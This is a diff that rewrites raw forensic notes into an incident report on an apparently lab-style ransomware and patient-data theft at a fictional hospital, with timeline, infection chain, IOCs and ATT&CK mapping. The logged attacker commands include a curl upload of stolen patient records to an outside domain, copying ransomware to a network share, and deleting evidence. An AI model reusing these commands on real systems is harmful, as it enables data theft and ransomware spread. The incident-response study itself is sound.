@@ -1,296 +1,71 @@
-Jojo's Hospital
-
-
-
-**Got a ransom file in a user's computer:**
-
-"timestamp": 2024-06-17T14:49:02.000Z,
-
-"hostname": AMFB-MACHINE,
-
-"username": andavis,
-
-"sha256": 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018,
-
-"path": C:\\Users\\andavis\\Documents\\We\_Have\_Your\_Data\_Pay\_Up.txt,
-
-"filename": We\_Have\_Your\_Data\_Pay\_Up.txt,
-
-"process\_name": explorer.exe
-
-&#x20;
-
-**Victim and End user:**
-
-"hire\_date": 2022-06-15T00:00:00.000Z,
-
-"name": Anthony Davis,
-
-"user\_agent": Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0),
-
-"ip\_addr": 10.10.0.1,
-
-"email\_addr": anthony\_davis@jojoshospital.org,
-
-"company\_domain": jojoshospital.org,
-
-"username": andavis,
-
-"role": Senior IT Administrator,
-
-"hostname": AMFB-MACHINE
-
-
-
-**Ransomer process:**
-
-"timestamp": 2024-06-17T13:35:12.000Z,
-
-"parent\_process\_name": cmd.exe,
-
-"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
-
-"process\_commandline": cmd.exe /c copy C:\\\\Users\\\\andavis\\\\Downloads\\\\lockbyte\_ransomer.exe \\\\jojos-hospital.org\\\\shared\\\\spread\_ransomware.exe,
-
-"process\_name": cmd.exe,
-
-"process\_hash": b29f5d70d4bf72d146b932550b23541b0797f597e24331d47052dad5212925ba,
-
-"hostname": AMFB-MACHINE,
-
-"username": andavis
-
-
-
-**Tools used to steal patient data:**
-
-"timestamp": 2024-06-17T14:23:25.000Z,
-
-"parent\_process\_name": cmd.exe,
-
-"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
-
-"process\_commandline": C:\\Users\\andavis\\Downloads\\patient\_data\_exporter.exe /export C:\\Users\\andavis\\Documents\\patient\_data\_1.zip /source \\\\jojos-hospital-server\\important\_data\\patient\_records,
-
-"process\_name": **patient\_data\_exporter.exe**,
-
-"process\_hash": 0d663ea9485770015ce187c5796b5e171bcf4b14d48175e7189a3456ccd8cb16,
-
-"hostname": AMFB-MACHINE,
-
-"username": andavis
-
-
-
-**Data stolen/uploaded:**
-
-"timestamp": 2024-06-17T17:18:57.000Z,
-
-"parent\_process\_name": cmd.exe,
-
-"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
-
-"process\_commandline": cmd.exe /c curl -T C:\\Users\\andavis\\Documents\\patient\_data\_1.zip https://secure-health-access.com/upload/patient\_data\_1.zip,
-
-"process\_name": cmd.exe,
-
-"process\_hash": 21f6b0962ea22e6eb0c1bb6143090e6929b801b54c584268148518c1864ec3c6,
-
-
-
-**Command to clear track/traces:**
-
-"timestamp": 2024-06-17T17:36:47.000Z,
-
-"parent\_process\_name": cmd.exe,
-
-"parent\_process\_hash": 614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f,
-
-"process\_commandline": **cmd.exe /c del C:\\Users\\andavis\\Documents\\patient\_data\_\*.zip**,
-
-"process\_name": cmd.exe,
-
-"process\_hash": 3400577569147cdb0ae8edbc9c77dd921a46ca43e7f386adee895a432baa2644,
-
-"hostname": AMFB-MACHINE,
-
-"username": andavis
-
-
-
-**exporter.exe:**
-
-"timestamp": 2024-06-17T14:22:29.000Z,
-
-"method": GET,
-
-"src\_ip": 10.10.0.1,
-
-"user\_agent": Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0),
-
-"url": https://secure-health-access.com/tools/patient\_data\_exporter.exe
-
-
-
-**hacker's ip:**
-
-203.0.113.1/203.0.113.2.....Domain: secure-health-access.com/emr-help.net
-
-
-
-**bypass recon**:
-
-"timestamp": 2024-05-20T11:46:59.000Z,
-
-"method": GET,
-
-"src\_ip": 203.0.113.2,
-
-"user\_agent": Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3,
-
-"url": https://jojoshospital.org/search=how+to+bypass+security+JoJo%27s+Hospital,
-
-"status\_code": 200
-
-
-
-**first patient record search:**
-
-"timestamp": 2024-05-20T00:00:00.000Z,
-
-"method": GET,
-
-"src\_ip": 203.0.113.1,
-
-"user\_agent": Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3,
-
-"url": https://jojoshospital.org/search=JoJo%27s+Hospital+patient+records,
-
-"status\_code": 200
-
-
-
-**Successful login on andavis:**
-
-"hostname": MAIL-SERVER01,
-
-"src\_ip": 203.0.113.1,
-
-"user\_agent": Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3 (KHTML, like Gecko) Version/5.0 Safari/535.46.3,
-
-"username": andavis,
-
-"result": Successful Login,
-
-"password\_hash": a9fbcdd6b449063a2ff822ea7d266402,
-
-"description": A user attempted to log in to their email
-
-
-
-fake ad website:
-
-raisinkanes.com
-
-
-
-**redirect site:**
-
-&#x20;nothing-to-see-here.net
-
-
-
-**another redirect:**
-
-&#x20;totally-legit-domain.com
-
-
-
-**redirect to docx:**
-
-&#x20;Raisin\_Kane\_Promo\_Offer.docx
-
-
-
-**redirect to pdf:**
-
-Raisin\_Kane\_Free\_Meal\_Voucher.pdf
-
-
-
-**first victim machine:**
-
-RQJQ-MACHINE time of download:  2024-05-01T09:56:50Z
-
-
-
-**malicious file dropped:**
-
-cobaltstrike.exe
-
-
-
-**execution of file:**
-
-&#x20;"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE" "C:\\Users\\evbrowne\\Downloads\\Raisin\_Kane\_Promo\_Offer.docx
-
-
-
-
-
-**hacker cobaltstrike ip connect:**
-
-93.238.22.122
-
-
-
-**Haxker Ip connect to host machine:** 
-
-&#x20;2024-05-14T12:24:45Z
-
-
-
-**hacker scanner tool:**
-
-advanced-ip-scanner.exe
-
-
-
-file exfiltrated/uploaded:
-
-&#x20;network\_diagrams.pdf/credentials.txt/ important\_network\_info.zip
-
-
-
-**domain uploaded to:**
-
-nothing-to-see-here.net
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+### Overview
+A sophisticated multi-stage attack against a hospital network resulted in patient data exfiltration and full ransomware deployment. The attacker leveraged a phishing campaign, CobaltStrike C2 infrastructure, and lateral movement through privileged credentials to ultimately compromise a Senior IT Administrator account.
+
+### Attack Timeline
+
+```
+May 1, 2024      → First machine (RQJQ-MACHINE) compromised via phishing
+May 14, 2024     → Attacker establishes C2 via CobaltStrike (93.238.22.122)
+June 17, 2024    → Credential theft; lateral movement to andavis (IT Admin)
+13:35 UTC        → lockbyte_ransomer.exe copied to network share
+14:22 UTC        → patient_data_exporter.exe downloaded
+14:23 UTC        → Patient records exported from hospital server
+17:18 UTC        → Stolen data uploaded to secure-health-access.com
+17:36 UTC        → Evidence deletion (del patient_data_*.zip)
+14:49 UTC        → Ransom note discovered: We_Have_Your_Data_Pay_Up.txt
+```
+
+### Infection Chain
+
+```
+Malicious Ad (raisinkanes.com)
+        ↓
+Redirect: nothing-to-see-here.net
+        ↓
+Redirect: totally-legit-domain.com
+        ↓
+Phishing Payload: Raisin_Kane_Promo_Offer.docx / Raisin_Kane_Free_Meal_Voucher.pdf
+        ↓
+Dropped: cobaltstrike.exe (RQJQ-MACHINE / user: evbrowne)
+        ↓
+C2 Beacon → 93.238.22.122
+        ↓
+Recon: advanced-ip-scanner.exe
+        ↓
+Exfil: network_diagrams.pdf, credentials.txt, important_network_info.zip
+        ↓
+Lateral movement → AMFB-MACHINE (andavis / Senior IT Admin)
+        ↓
+Deploy: lockbyte_ransomer.exe → \\jojos-hospital.org\shared\spread_ransomware.exe
+        ↓
+Exfil: patient_data_1.zip → https://secure-health-access.com/upload/
+        ↓
+Cover tracks: del patient_data_*.zip
+        ↓
+Ransom dropped: We_Have_Your_Data_Pay_Up.txt
+```
+
+### Indicators of Compromise (IOCs)
+
+| Type | Value |
+|------|-------|
+| Attacker IPs | `203.0.113.1`, `203.0.113.2` |
+| C2 IP | `93.238.22.122` |
+| Malicious Domains | `secure-health-access.com`, `emr-help.net`, `raisinkanes.com`, `nothing-to-see-here.net`, `totally-legit-domain.com` |
+| File Hashes (SHA256) | `97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018` (ransom note) |
+| Process Hash | `0d663ea9485770015ce187c5796b5e171bcf4b14d48175e7189a3456ccd8cb16` (patient_data_exporter.exe) |
+| Malicious Executables | `lockbyte_ransomer.exe`, `patient_data_exporter.exe`, `cobaltstrike.exe`, `advanced-ip-scanner.exe` |
+| Compromised Account | `andavis` — `anthony_davis@jojoshospital.org` (Senior IT Administrator) |
+| Password Hash | `a9fbcdd6b449063a2ff822ea7d266402` |
+
+### Tools & Techniques (MITRE ATT&CK)
+
+| Technique | ID | Tool Used |
+|-----------|-----|-----------|
+| Phishing: Spearphishing Link | T1566.002 | Malicious .docx / .pdf lures |
+| Command & Control | T1219 | CobaltStrike (cobaltstrike.exe) |
+| Discovery — Network Scanning | T1046 | advanced-ip-scanner.exe |
+| Lateral Movement | T1021 | Stolen admin credentials |
+| Exfiltration Over Web Service | T1567 | curl + secure-health-access.com |
+| Data Encrypted for Impact | T1486 | lockbyte_ransomer.exe |
+| Indicator Removal | T1070.004 | `del patient_data_*.zip` |
